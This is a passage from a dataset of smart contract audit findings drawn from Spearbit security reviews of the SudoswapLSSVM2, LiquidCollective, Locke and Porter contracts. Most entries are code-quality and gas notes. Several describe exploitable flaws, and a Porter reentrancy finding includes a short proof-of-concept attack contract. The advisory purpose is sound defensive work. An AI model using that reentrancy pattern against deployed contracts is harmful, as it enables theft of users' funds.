error. However, if the error data is of no interest, one can use a simple catch statement without error data.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Stale constant and comments reduce readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "After some updates, the logic was added ~2 years ago when enum was changed to int16. Based on the comments and given that was upgradeable, it was expected that one could add new unconfigured specs with negative IDs between NONE (by decrementing it) and NOT_CONFIGURED. In this non-upgradeable fork, the current constants treat only the spec ID of 0 as NOT_CONFIGURED. // Anything > NONE and <= NOT_CONFIGURED is considered not configured int16 private constant NONE = -1; int16 private constant NOT_CONFIGURED = 0;", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Different MAX_FEE value and comments in different places is misleading", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The same MAX_FEE constant is declared in different files with different values, while comments indi- cate that these values should be the same. // 50%, must <= 1 - MAX_PROTOCOL_FEE (set in LSSVMPairFactory) uint256 internal constant MAX_FEE = 0.5e18; uint256 internal constant MAX_PROTOCOL_FEE = 0.1e18; // 10%, must <= 1 - MAX_FEE`", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Events without indexed event parameters make it harder/inefficient for off-chain tools", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Indexed event fields make them quickly accessible to off-chain tools that parse events. However, note that each indexed field costs extra gas during emission; so it's not necessarily best to index the maximum allowed per event (three fields).", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational PropertyCheckerFactory.sol#L11, LSSVMPair.sol#L83,"]}, {"title": "Some functions included in LSSVMPair are not found in ILSSVMPair.sol and ILSSVMPairFactory- Like.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "LSSVMPair contract defines the following functions which are missing from interface ILSSVMPair: 53 ROYALTY_ENGINE() spotPrice() delta() assetRecipient() pairVariant() factory() swapNFTsForToken() (2 versions) swapTokenForSpecificNFTs() getSellNFTQuoteWithRoyalties() call() withdrawERC1155()", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Absent/Incomplete Natspec affects readability and maintenance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Comments are key to understanding the codebase logic. In particular, Natspec comments provide rich documentation for functions, return variables and more. This documentation aids users, developers and auditors in understanding what the functions within the contract are meant to do. However, some functions within the codebase contain issues with respect to their comments with either no Natspec or incomplete Natspec annotations, leading to partial descriptions of the functions.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational IOwnershipTransferReceiver.sol#L6, OwnableWithTransferCallback.sol#L39-L42, RangeProp-"]}, {"title": "MAX_SETTABLE_FEE value does not follow a standard notation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The protocol establishes several constant hard-coded MAX_FEE-like variables across different con- tracts. The percentages expressed in those variables should be declared in a standard way all over the codebase. In StandardSettings.sol#L22, the standard followed by the rest of the codebase is not respected. Not respecting the standard notation may confuse the reader.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "No modifier for __Ownable_init", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Usually __Ownable_init also has a modifier like initializer or onlyInitializing, see Own- ableUpgradeable.sol#L29. The version in OwnableWithTransferCallback.sol doesn't have this. It is not really necessary as the function is internal but it is more robust if it has. function __Ownable_init(address initialOwner) internal { _owner = initialOwner; }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Wrong value of seconds in year slightly affects precision", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Calculation of ONE_YEAR_SECS takes into account leap years (typically 365.25 days), looking for most exact precision. However as can be seen at NASA and stackoverflow, the value is slightly different. Current case: 365.2425 days = 31_556_952 / (24 * 3600) NASA case: 365.2422 days = 31_556_926 / (24 * 3600)", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Missing idempotent checks may be added for consistency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Setter functions could check if the value being set is the same as the variable's existing value to avoid doing a state variable write in such scenarios and they could also revert to flag potentially mismatched offchain-onchain states. While this is done in many places, there are a few setters missing this check.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Missing events affect transparency and monitoring", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Missing events in critical functions, especially privileged ones, reduce transparency and ease of monitoring. Users may be surprised at changes affected by such functions without being able to observe related events.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational LSSVMPair.sol#L640-L645, LSSVMPairFactory.sol#L485-L492, LSSVMPairFactory.sol#L501-L508,"]}, {"title": "Wrong error returned affects debugging and off-chain monitoring", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Error.INVALID_NUMITEMS is declared for 0 case, but is returned twice in the same function: first time for numItems == 0 and second time for numItems >= nftBalance. This can make hard to know why it is failing.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Functions can be renamed for clarity and consistency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Since both functions cloneETHPair() and cloneERC20Pair() use IERC721 nft as a parameter, renaming them to cloneERC721ETHPair() and cloneERC721ERC20Pair() respectively makes it clearer that the functions process ERC721 tokens. This also provides consistency in the naming of functions considering that we already have function cloneERC1155ETHPair() using this nomenclature.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Two events TokenDeposit() with different parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The event TokenDeposit() of LSSVMPairFactory has an address parameter while the event Tok- enDeposit() of LSSVMPair has an uint256 parameter. This might be confusing. contract LSSVMPairFactory { ... event TokenDeposit(address poolAddress); ... } abstract contract LSSVMPair ... { ... event TokenDeposit(uint256 amount); ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Unused imports affect readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The following imports are unused in  XykCurve.sol import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\"; import {LSSVMPair} from \"../LSSVMPair.sol\"; import {LSSVMPairERC20} from \"../LSSVMPairERC20.sol\"; import {LSSVMPairCloner} from \"../lib/LSSVMPairCloner.sol\"; import {ILSSVMPairFactoryLike} from \"../LSSVMPairFactory.sol\";  LSSVMPairERC20.sol 58 import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\"; import {ICurve} from \"./bonding-curves/ICurve.sol\"; import {CurveErrorCodes} from \"./bonding-curves/CurveErrorCodes.sol\";  LSSVMPairETH.sol import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\"; import {ICurve} from \"./bonding-curves/ICurve.sol\";", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Use of isPair() is not intuitive", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "There are two usecases for isPair() 1) To check if the contract is a pair of any of the 4 types. Here the type is always retrieved via pairVariant(). 2) To check if a pair is ETH / ERC20 / ERC721 / ERC1155. Each of these values are represented by two different pair types. Using isPair() this way is not intuitive and some errors have been made in the code where only one value is tested. Note: also see issue \"pairTransferERC20From only supports ERC721 NFTs\". Function isPair() could be refactored to make the code easier to read and maintain. function isPair(address potentialPair, PairVariant variant) public view override returns (bool) { ... } These are the occurrences of use case 1: LSSVMPairFactory.sol: require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair address\"); ,! LSSVMPairFactory.sol: address\"); ,! LSSVMPairFactory.sol: require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair if (isPair(recipient, LSSVMPair(recipient).pairVariant())) { // router interaction, which first queries `pairVariant()` LSSVMPairERC20.sol: LSSVMPairERC20.sol: LSSVMPairERC20.sol: erc721/LSSVMPairERC721.sol: erc721/LSSVMPairERC721.sol: erc1155/LSSVMPairERC1155.sol: // router and VeryFastRouter function pairTransferERC20From(..., ILSSVMPairFactoryLike.PairVariant variant) ... { router.pairTransferERC20From(..., pairVariant()); router.pairTransferERC20From(..., pairVariant() router.pairTransferERC20From(..., pairVariant()); router.pairTransferNFTFrom(..., pairVariant()); router.pairTransferNFTFrom(..., pairVariant()); router.pairTransferERC1155From(..., pairVariant()); ... require(factory.isPair(msg.sender, variant), \"Not pair\"); ... } function pairTransferNFTFrom(..., ILSSVMPairFactoryLike.PairVariant variant ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... ... } function pairTransferERC1155From(..., ILSSVMPairFactoryLike.PairVariant variant) ... { ... require(factory.isPair(msg.sender, variant), \"Not pair\"); ... } These are the occurrences of use case 2: 59 LSSVMPairFactory.sol: StandardSettings.sol: StandardSettings.sol: StandardSettings.sol: StandardSettings.sol: (isPair(...ERC721_ERC20) ...isPair(....ERC721_ETH) ...isPair(...ERC721_ERC20) ...isPair(...ERC721_ETH) ...isPair(...ERC721_ERC20) || isPair(...ERC1155_ERC20)) || ...isPair(...ERC1155_ETH) || ...isPair(...ERC1155_ERC20) || ...isPair(...ERC1155_ETH) || ...isPair(...ERC1155_ERC20)", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Royalty related code spread across different contracts affects readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The contract LSSVMPairFactory contains the function authAllowedForToken(), which has a lot of interactions with external contracts related to royalties. The code is rather similar to code that is present in the RoyaltyEngine contract. Combining this code in RoyaltyEngine contract would make the code cleaner and easier to read.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Calculation of CurrentValidatorExitsDemand and TotalValidatorExitsRequested using unsolicited exits can happen at the end of _setStoppedValidatorCounts(...)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review.pdf", "body": "Calculation of CurrentValidatorExitsDemand and TotalValidatorExitsRequested using unso- licited exits can happen at the end of _setStoppedValidatorCounts(...) to avoid extra operations like taking minimum per iteration of the loops. Note that: an = an(cid:0)1 (cid:0) min(an(cid:0)1, bn) ) an = a0 (cid:0) min(a0, n X i=1 bn) = max(0, a0 (cid:0) n X i=1 bn)", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Informational"]}, {"title": "use _setCurrentValidatorExitsDemand", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review.pdf", "body": "If an update is needed for CurrentValidatorExitsDemand in _setStoppedValidatorCounts(...), the internal function _setCurrentValidatorExitsDemand is not used.", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Informational"]}, {"title": "Changes to the emission of RequestedValidatorExits event during catch-up", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review.pdf", "body": "The event log will be different between the old and new implementations. In the old implementation, the latest RequestedValidatorExits event in the logs will always contain the most up-to-date count of requested exits (count) of an operator after a \"catch-up\" attempt. This is because a new RequestedValidatorExits event with the up-to-date currentStoppedCount is emitted at the end of the async requestValidatorExits function call. However, in the new implementation, the latest RequestedValidatorExits event in the logs contains the outdated or previous count of an operator after a \"catch-up\" attempt since a new RequestedValidatorExits event is not emitted at the end of the Oracle reporting transaction. If any off-chain component depends on the latest RequestedValidatorExits event in the logs to determine the count of requested exits (count), it might potentially cause the off-chain component to read and process outdated information. For instance, an operator's off-chain component might be reading the count within the latest Request- edValidatorExits event in the logs and comparing it against its internal counter to decide if more validators need to be exited. The following shows the discrepancy between the events emitted between the old and new implementations. Catch-up implementation in the previous design 1) Catch-up was carried out async when someone called the requestValidatorExits > _pickNextValida- torsToExitFromActiveOperators function 2) Within the _pickNextValidatorsToExitFromActiveOperators function. Assume an operator called opera It will attempt to \"catch-up\" by and its currentRequestedExits is less than the currentStoppedCount. performing the following actions: 1) Emit UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount) event. 2) Let x be the no. of validator count to \"catch-up\" (x = currentStoppedCount (cid:0) currentRequestedExits) 3) opera.picked will be incremented by x. Since opera.picked has not been initialized yet, opera.picked = x 3) Assume that the opera is neither the operator with the highest validation count nor the operator with the second highest. As such, opera is not \"picked\" to exit its validators 5 4) Near the end of the _pickNextValidatorsToExitFromActiveOperators function, it will loop through all op- erators that have operator .picked > 0 and perform some actions. The following actions will be performed against opera since opera.picked > 0: 1) Emit RequestedValidatorExits(opera, currentStoppedCount) event 2) Set opera.requestedExits = currentStoppedCount. 5) After the transaction, two events were emitted for opera to indicate a catch-up had been attempted.  UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount)  RequestedValidatorExits(opera, currentStoppedCount) Catch-up implementation in the new design 1. Catch-up was carried out within the _setStoppedValidatorCounts function during Oracle reporting. 2. Let _stoppedValidatorCounts[idx] be the currentStoppedCount AND operators.requestedExits be currentRequestedExits 3. Assume an operator called opera and its currentRequestedExits is less than the currentStoppedCount. It will attempt to \"catch-up\" by performing the following actions: 1. Emit UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount) event. 2. Set opera.requestedExits = currentStoppedCount. 4. After the transaction, only one event was emitted for opera to indicate a catch-up had been attempted.  UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount) In addition, as per the comment below, it was understood that unsolicited exits are considered as if exit requests were performed for them. In this case, the latest RequestedValidatorExits event in the logs should reflect the most up-to-date count of exit requests for an operator including unsolicited exits at any time. File: OperatorsRegistry.1.sol 573: ,! 574: ,! were performed for them vars.currentValidatorExitsDemand); // we decrease the demand, considering unsollicited exits as if the exit requests vars.currentValidatorExitsDemand -= LibUint256.min(unsollicitedExits,", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Informational"]}, {"title": "UnaccruedSeconds do not increase even if nobody is actively staking", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "The unstreamed variable tracks whether someone is staking in the contract or not. However, because of the division precision loss at Locke.sol#L164-L166 and Locke.sol#L187, unstreamed > 0 may happen even when everyone has already withdrawn all deposited tokens from the contract, i.e. ts.token = 0 for everyone. Consider the following proof of concept with only two users, Alice and Bob:  streamDuration = 8888  At t = startTime, Alice stakes 1052 wei of deposit tokens.  At t = startTime + 99, Bob stakes 6733 wei of deposit tokens.  At t = startTime + 36, both Alice and Bob exits from the contract. At this point Alices and Bobs ts.tokens are both 0 but unstreamed = 1 wei. The abovementined numbers are the resault of a fuzzing campaign and were not carefully crafted, therefore this issue can also occur under normal circumstances. function updateStreamInternal() internal { ... uint256 tdelta = timestamp - lastUpdate; if (tdelta > 0) { if (unstreamed == 0) { unaccruedSeconds += uint32(tdelta); } else { unstreamed -= uint112(tdelta * unstreamed / (endStream - lastUpdate)); } } ... }", "labels": ["Spearbit", "Locke", "Severity: High Risk"]}, {"title": "Old governor can call acceptGov() after renouncing its role through _abdicate()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "The __abdicate function does not reset pendingGov value to 0. Therefore, if a pending governor is set the user can become a governor by calling acceptGov.", "labels": ["Spearbit", "Locke", "Severity: High Risk"]}, {"title": "User can lose their reward due truncated division", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "The truncated division can cause users to lose rewards in this update round which may happen when any of the following conditions are true: 1. RewardToken.decimals() is too low. 2. Reward is updated too frequently. 3. StreamDuration is too large. 4. TotalVirtualBalance is too large (e.g., stake near the end of stream). This could potentially happen especially when the 1st case is true. Consider the following scenario:  rewardToken.decimals() = 6.  depositToken.decimals() can be any (assume its 18).  rewardTokenAmount = 1K * 10**6.  streamDuration = 1209600 (two weeks).  totalVirtualBalance = streamDuration * depositTokenAmount / timeRemaining where depositToken- Amount = 100K 10**18 and timeRemaining = streamDuration (a user stakes 100K at the beginning of the stream) lastApplicableTime() - lastUpdate = 100 (about 7 block-time). Then rewards = 100 * 1000 * 10**6 * 10**18 / 1209600 / (1209600 * 100000 * 10**18 / 1209600) = 0.8267 < 1. User wants to buy the reward token at the price of 100K/1K = 100 deposit token but does not get any because of the truncated division. function rewardPerToken() public override view returns (uint256) { if (totalVirtualBalance == 0) { return cumulativeRewardPerToken; } else { // time*rewardTokensPerSecond*oneDepositToken / totalVirtualBalance uint256 rewards; unchecked { rewards = (uint256(lastApplicableTime() - lastUpdate) * rewardTokenAmount * ,! depositDecimalsOne) / streamDuration / totalVirtualBalance; } return cumulativeRewardPerToken + rewards; } }", "labels": ["Spearbit", "Locke", "Severity: High Risk"]}, {"title": "The streamAmt check may prolong a user in the stream", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Assume that the amount of tokens staked by a user (ts.tokens) is low. This check allows another person to deposit a large stake in order to prolong the user in a stream (untilstreamAmt for the user becomes non-zero). For this duration the user would be receiving a bad rate or 0 altogether for the reward token while being unable to exit from the pool. if (streamAmt == 0) revert ZeroAmount(); Therefore, if Alice stakes a small amount of deposit token and Bob comes along and deposits a very large amount of deposit token, tts in Alices interest to exit the pool as early as possible especially when this is an indefinite stream. Otherwise the user would be receiving a bad rate for their deposit token.", "labels": ["Spearbit", "Locke", "Severity: Medium Risk"]}, {"title": "User can stake before the stream creator produced a funding stream", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Consider the following scenario: 1. Alice stakes in a stream before the stream starts. 2. Nobody funds the stream,. 3. In case of an indefinite stream Alice loses some of her deposit depending on when she exits the stream. For a usual stream Alice will have her deposit tokens locked until endDepositLock.", "labels": ["Spearbit", "Locke", "Severity: Medium Risk"]}, {"title": "Potential funds locked due low token decimal and long stream duration", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "In case where the deposit token decimal is too low (4 or less) or when the remaining stream duration is too long, checking streamAmt > 0 may affect regular users. They could be temporarily blocked by the contract, i.e. they cannot stake, withdraw, or get rewards, and should wait until streamAmt > 0 or the stream ends. Altough unlikely to happen it still is a potential lock of funds issue. 11 function updateStreamInternal() internal { ... if (acctTimeDelta > 0) { if (ts.tokens > 0) { uint112 streamAmt = uint112(uint256(acctTimeDelta) * ts.tokens / (endStream - ,! ts.lastUpdate)); if (streamAmt == 0) revert ZeroAmount(); ts.tokens -= streamAmt; } ... }", "labels": ["Spearbit", "Locke", "Severity: Medium Risk"]}, {"title": "Sanity check on the reward tokens decimals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Add sanity check on the reward tokens decimals, which shouldnt exceed 33 because Token- Stream.rewards has a uint112 type. constructor( ) { uint64 _streamId, address creator, bool _isIndefinite, address _rewardToken, address _depositToken, uint32 _startTime, uint32 _streamDuration, uint32 _depositLockDuration, uint32 _rewardLockDuration, uint16 _feePercent, bool _feeEnabled LockeERC20( _depositToken, _streamId, _startTime + _streamDuration + _depositLockDuration, _startTime + _streamDuration, _isIndefinite ) MinimallyExternallyGoverned(msg.sender) // inherit factory governance // No error code or msg to reduce bytecode size require(_rewardToken != _depositToken); // set fee info feePercent = _feePercent; feeEnabled = _feeEnabled; // limit feePercent require(feePercent < 10000); // store streamParams startTime = _startTime; streamDuration = _streamDuration; // set in shared state 12 endStream = startTime + streamDuration; endDepositLock = endStream + _depositLockDuration; endRewardLock = startTime + _rewardLockDuration; // set tokens depositToken = _depositToken; rewardToken = _rewardToken; // set streamId streamId = _streamId; // set indefinite info isIndefinite = _isIndefinite; streamCreator = creator; uint256 one = ERC20(depositToken).decimals(); if (one > 33) revert BadERC20Interaction(); depositDecimalsOne = uint112(10**one); // set lastUpdate to startTime to reduce codesize and first users gas lastUpdate = startTime; }", "labels": ["Spearbit", "Locke", "Severity: Low Risk"]}, {"title": "Use a stricter bound for transferability delay", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "modifier transferabilityDelay { // ensure the time is after end stream if (block.timestamp < endStream) revert NotTransferableYet(); _; }", "labels": ["Spearbit", "Locke", "Severity: Low Risk"]}, {"title": "Potential issue with malicious stream creator", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Assume that users staked tokens at the beginning. The malicious stream creator could come and stake an extremely large amount of tokens thus driving up the value of totalVirtualBalance. This means that users will barely receive rewards while giving away deposit tokens at the same rate. Users can exit the pool in this case to save their unstreamed tokens. 13 function rewardPerToken() public override view returns (uint256) { if (totalVirtualBalance == 0) { return cumulativeRewardPerToken; } else { unchecked { rewards = (uint256(lastApplicableTime() - lastUpdate) * rewardTokenAmount * ,! depositDecimalsOne) / streamDuration / totalVirtualBalance; } return cumulativeRewardPerToken + rewards; } }", "labels": ["Spearbit", "Locke", "Severity: Low Risk"]}, {"title": "Moving check require(feePercent < 10000) in updateFeeParams to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "feePercent comes directly from LockeFactorys feeParams.feePercent, which is configured in the updateFeeParams function and used across all Stream contracts. Moving this check into the updateFeeParams function can avoid checking in every contract and thus save gas.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Use calldata instead of memory for some function parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Having function arguments in calldata instead of memory is more optimal in the aforementioned cases. See the following reference.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Update cumulativeRewardPerToken only once after stream ends", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Since cumulativeRewardPerToken does not change once it is updated after the stream ends, it has to be updated only once.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Expression 10**one can be unchecked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "uint256 one = ERC20(depositToken).decimals(); if (one > 33) revert BadERC20Interaction(); depositDecimalsOne = uint112(10**one)", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Calculation of amt can be unchecked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "The value newBal in this context is always greater than prevBal because of the check located at Locke.sol#534. Therefore, we can use unchecked subtraction.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Change lastApplicableTime() to endStream", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Since block.timestamp >= endStream in the abovementioned cases the lastApplicableTime function will always return endStream.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Simplifying code logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "if (timestamp < lastUpdate) { return tokens; } uint32 acctTimeDelta = timestamp - lastUpdate; if (acctTimeDelta > 0) { uint256 streamAmt = uint256(acctTimeDelta) * tokens / (endStream - lastUpdate); return tokens - uint112(streamAmt); } else { return tokens; } 17 function currDepositTokensNotYetStreamed(IStream stream, address who) external view returns (uint256) { unchecked { uint32 timestamp = uint32(block.timestamp); (uint32 startTime, uint32 endStream, ,) = stream.streamParams(); if (block.timestamp >= endStream) return 0; ( uint256 lastCumulativeRewardPerToken, uint256 virtualBalance, uint112 rewards, uint112 tokens, uint32 lastUpdate, bool merkleAccess ) = stream.tokenStreamForAccount(address(who)); if (timestamp < lastUpdate) { return tokens; } uint32 acctTimeDelta = timestamp - lastUpdate; if (acctTimeDelta > 0) { uint256 streamAmt = uint256(acctTimeDelta) * tokens / (endStream - lastUpdate); return tokens - uint112(streamAmt); } else { return tokens; } } }", "labels": ["Spearbit", "Locke", "Severity: Informational"]}, {"title": "Freeze Redeems if bonds too Large", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf", "body": "Issuing too many bonds can result in users being unable to redeem. This is caused by arithmetic overow in previewRedeemAtMaturity. If a users bonds andpaidAmounts (or bonds * nonPaidAmount) product is greater than 2**256, it will overow, reverting all attempts to redeem bonds.", "labels": ["Spearbit", "Porter", "Severity: Medium Risk"]}, {"title": "Reentrancy in withdrawExcessCollateral() and withdrawExcessPayment() functions.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf", "body": "withdrawExcessCollateral() and withdrawExcessPayment() enable the caller to withdraw excess collateral and payment tokens respectively. Both functions are guarded by an onlyOwner modier, limiting their access to the owner of the contract. function withdrawExcessCollateral(uint256 amount, address receiver) external onlyOwner function withdrawExcessPayment(address receiver) external onlyOwner When transferring tokens, execution ow is handed over to the token contract. Therefore, if a malicious token manages to call the owners address it can also call these functions again to withdraw more tokens than required. As an example consider the following case where the collateral tokens transferFrom() function calls the owners address: 4 function transferFrom( address from, address to, uint256 amount ) public virtual override returns (bool) { if (reenter) { reenter = false; owner.attack(bond, amount); } address spender = _msgSender(); _spendAllowance(from, spender, amount); _transfer(from, to, amount); return true; } and the owner contract has a function: function attack(address _bond, uint256 _amount) external { IBond(_bond).withdrawExcessCollateral(_amount, address(this)); } When withdrawExcessCollateral() is called by owner, it allows it to withdraw double the amount via reentrancy.", "labels": ["Spearbit", "Porter", "Severity: Medium Risk"]}, {"title": "burn() and burnFrom() allow users to lose their bonds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf", "body": "The Bond contract inherits from ERC20BurnableUpgradeable. contract Bond is IBond, OwnableUpgradeable, ERC20BurnableUpgradeable, This exposes the burn() and burnFrom() functions to users who could get their bonds burned due to an error or a front-end attack.", "labels": ["Spearbit", "Porter", "Severity: Low Risk"]}, {"title": "Missing two-step transfer ownership pattern", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf", "body": "After a bond is created its ownership is transferred to the wallet which invoked the createBond function, but it can be later transferred to anyone at any time or the renounceOwnership function can be called. The Bond contract uses the Ownable Openzeppelin contract, which is a simple mechanism to transfer ownership without supporting a two-step ownership transfer pattern. OpenZeppelin describes Ownable as: Ownable is a simpler mechanism with a single owner \"role\" that can be assigned to a single account. This simpler mechanism can be useful for quick tests but projects with production concerns are likely to outgrow it. Ownership transfer is a critical operation and transferring it to an inaccessible wallet or renouncing ownership by mistake can effectively lock the collateral in the contract forever.", "labels": ["Spearbit", "Porter", "Severity: Low Risk"]}, {"title": "Inefcient initialization of minimal proxy implementation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf", "body": "The Bond contract uses a minimal proxy pattern when deployed by BondFactory. The proxy pattern requires a special initialize method to be called to set the state of each cloned contract. Nevertheless, the implementation contract can be left uninitialized, giving an attacker the opportunity to invoke the initialization. constructor() { tokenImplementation = address(new Bond()); _grantRole(DEFAULT_ADMIN_ROLE, _msgSender()); } After the reporting the issue it was discovered that a separate (not merged) development branch implements a deployment script which initializes the Bond implementation contract after the main deployment of BondFactory, leaving a narrow window for the attacker to leverage this issue and reducing impact signicantly. deploy_bond_factory.ts#L24 6 const implementationContract = (await ethers.getContractAt( \"Bond\", await factory.tokenImplementation() )) as Bond; try { await waitUntilMined( await implementationContract.initialize( \"Placeholder Bond\", \"BOND\", deployer, THREE_YEARS_FROM_NOW_IN_SECONDS, \"0x0000000000000000000000000000000000000000\", \"0x0000000000000000000000000000000000000001\", ethers.BigNumber.from(0), ethers.BigNumber.from(0), 0 ) ); } catch (e) { console.log(\"Is the contract already initialized?\"); console.log(e); } Due to the fact that the initially reviewed code did not have the proper initialization for the Bond implementation (as it was an unmerged branch) and because in case of a successful exploitation the impact on the system remains minimal, this nding is marked as low risk. It is not necessary to create a separate transaction and initialize the storage of the implementation contract to prevent unauthorized initialization.", "labels": ["Spearbit", "Porter", "Severity: Low Risk"]}, {"title": "Verify amount is greater than 0 to avoid unnecessarily safeTransfer() calls", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf", "body": "Balance should be checked to avoid unnecessary safeTransfer() calls with an amount of 0.", "labels": ["Spearbit", "Porter", "Severity: Gas Optimization"]}, {"title": "Improve checks for token allow-list", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf", "body": "The BondFactory contract has two enabled allow-lists by default, which require the teams approval for issuers and tokens to create bonds. However, the screening process was not properly dened before the assessment. In 